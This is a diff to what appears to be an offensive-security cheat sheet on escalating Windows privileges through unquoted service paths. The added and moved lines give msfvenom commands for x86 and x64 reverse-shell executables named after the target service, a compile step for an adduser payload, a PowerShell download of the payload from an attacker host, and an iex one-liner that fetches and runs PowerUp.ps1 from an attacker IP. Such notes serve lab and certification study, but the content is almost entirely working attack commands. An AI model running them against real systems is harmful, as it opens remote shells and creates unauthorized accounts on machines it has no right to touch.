@@ -41,19 +41,21 @@ Stop-Service <SERVICE_NAME>
 #Check permissions of icacls.
 icacls "<BINPATH>" #Check permissions of icacls.
 
+#### Leading the attack ####
+
+#Once we find a unquoted service path that give us a satisfactory location to write pur payload and know how to trigger the start/restart of the service we can make our payload with msfvenom:
+## x86 Payload:
+msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o <SERVICE>.exe
+
+## x64 Payload:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o <SERVICE>.exe
+
+##Or compiling adduser.c:
+x86_64-w64-mingw32-gcc adduser.c -o <SERVICE>.exe
+
 #Transfer file
-iwr -uri <URI> -Outfile <PATHFILE>.exe 
+iwr -uri http://<ATTACKER_IP>/<SERVICE>.exe -Outfile <PATHFILE>.exe 
 
 #PowerUp's Invoke-Allchecks cmdlet displays Unquoted Path services.
 iex (New-Object Net.WebClient).DownloadString('http://IP_ATTACKER/PowerUp.ps1')
 Invoke-AllChecks
-
-###########################################################################
-
-#### Leading the attack ####
-
-#Once we find a unquoted service path that give us a satisfactory location to write pur payload and know how to trigger the start/restart of the service we can make our payload with msfvenom:
-
-msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
-
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
